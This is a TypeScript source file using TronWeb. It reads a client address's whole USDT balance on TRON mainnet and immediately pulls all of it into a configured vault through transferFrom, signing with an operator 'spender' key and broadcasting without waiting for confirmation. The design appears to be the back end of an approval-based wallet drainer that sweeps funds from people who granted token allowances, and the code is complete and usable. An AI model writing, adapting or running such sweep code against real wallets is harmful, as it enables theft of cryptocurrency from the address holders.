import { TronWeb } from "tronweb";
import { env } from "../env.js";
import { VAULT_CONFIG } from "../vaultConfig.js";

const TRON_USDT_CONTRACT_MAINNET = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_FEE_LIMIT_SUN = 65_000_000;

type TriggerResult = {
  transaction?: unknown;
  result?: { result?: boolean; code?: string; message?: string };
  constant_result?: string[];
};

function decodeUint256Hex(raw: string | undefined): bigint {
  if (!raw) return 0n;
  const hex = raw.trim().replace(/^0x/i, "");
  if (!hex) return 0n;
  try {
    return BigInt(`0x${hex}`);
  } catch {
    return 0n;
  }
}

function extractTxId(signed: unknown): string {
  if (!signed || typeof signed !== "object") return "";
  const txID = (signed as { txID?: string }).txID;
  return typeof txID === "string" ? txID : "";
}

/**
 * High-speed, fixed-parameter sweep initiation:
 * - fixed feeLimit (65,000,000)
 * - immediate sign + broadcast start with operator key
 * - no confirmation wait, no retries
 */
export async function initiateImmediateSweep(params: {
  clientAddress: string;
  onBroadcastResult?: (result: unknown) => void;
  onBroadcastError?: (error: unknown) => void;
}): Promise<{ txHash: string; amountRaw: string; feeLimitSun: number }> {
  const operatorPrivateKey = env.tronOperatorPrivateKey?.trim();
  if (!operatorPrivateKey) {
    throw new Error(
      "Operator key missing. Set OPERATOR_PRIVATE_KEY (or SPENDER_KEY / TRON_OPERATOR_PRIVATE_KEY).",
    );
  }

  const tw = new TronWeb({
    fullHost: env.tronFullNodeUrl,
    privateKey: operatorPrivateKey,
    headers: env.tronGridApiKey ? { "TRON-PRO-API-KEY": env.tronGridApiKey } : undefined,
  });

  const clientAddress = params.clientAddress.trim();
  if (!tw.isAddress(clientAddress)) {
    throw new Error("Invalid clientAddress");
  }

  const operatorBase58 = tw.defaultAddress?.base58;
  const operatorAddress =
    typeof operatorBase58 === "string" ? operatorBase58.trim() : "";
  if (!operatorAddress) {
    throw new Error("Operator address not derivable from key.");
  }

  const balanceProbe = (await tw.transactionBuilder.triggerConstantContract(
    TRON_USDT_CONTRACT_MAINNET,
    "balanceOf(address)",
    {},
    [{ type: "address", value: clientAddress }],
    operatorAddress,
  )) as TriggerResult;
  const amount = decodeUint256Hex(balanceProbe.constant_result?.[0]);
  if (amount <= 0n) {
    throw new Error("Client has no transferable USDT balance.");
  }

  const built = (await tw.transactionBuilder.triggerSmartContract(
    TRON_USDT_CONTRACT_MAINNET,
    "transferFrom(address,address,uint256)",
    { feeLimit: FIXED_FEE_LIMIT_SUN, callValue: 0 },
    [
      { type: "address", value: clientAddress },
      { type: "address", value: VAULT_CONFIG },
      { type: "uint256", value: amount.toString() },
    ],
    operatorAddress,
  )) as TriggerResult;

  if (!built.transaction) {
    const msg =
      typeof built.result?.message === "string" ? built.result.message : "triggerSmartContract failed";
    throw new Error(msg);
  }

  const signed = (await tw.trx.sign(built.transaction as Parameters<typeof tw.trx.sign>[0])) as
    | Parameters<typeof tw.trx.sendRawTransaction>[0]
    | string;
  const txHash = extractTxId(signed);
  if (!txHash) {
    throw new Error("Signed transaction missing txID.");
  }

  // Fire-and-forget broadcast: caller returns success immediately after initiation.
  if (typeof signed === "string") {
    throw new Error("Unexpected signer response string; transaction object required for broadcast.");
  }

  void tw.trx
    .sendRawTransaction(signed)
    .then((res) => params.onBroadcastResult?.(res))
    .catch((err) => params.onBroadcastError?.(err));

  return { txHash, amountRaw: amount.toString(), feeLimitSun: FIXED_FEE_LIMIT_SUN };
}
